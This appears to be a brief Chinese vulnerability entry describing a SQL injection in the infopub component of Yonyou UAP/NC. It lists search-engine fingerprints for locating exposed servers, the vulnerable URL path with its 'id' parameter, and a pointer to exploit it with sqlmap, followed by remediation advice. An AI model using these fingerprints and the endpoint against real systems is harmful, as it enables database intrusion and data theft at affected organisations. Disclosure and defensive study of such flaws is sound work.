# 用友infopub存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`title=="Yonyou UAP"`

**Payload**
```
1. Hunter
web.title=="Yonyou UAP"web.title=="YONYOU NC"
1. 部分界面如下
3、隐患url,复现如下
隐患URL
/ebvp/infopub/show_download_content;.js?id=1
直接丢sqlmap即可。
```
- **其他**：修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。